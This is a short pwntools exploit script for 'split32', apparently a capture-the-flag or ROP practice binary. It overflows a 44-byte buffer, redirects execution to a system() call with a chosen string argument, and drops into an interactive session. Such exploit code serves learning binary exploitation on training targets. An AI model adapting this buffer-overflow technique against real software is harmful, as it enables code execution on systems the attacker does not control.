from pwn import *

e = ELF("split32")
usefulStringAddr = e.symbols["usefulString"]
usefulFunctionPartAddr = 0x08048657


eip = p32(usefulFunctionPartAddr)
argSystem = p32(usefulStringAddr)

crap = "A"* 44

io = process("split32")

io.sendline(crap + eip + argSystem)

io.interactive()
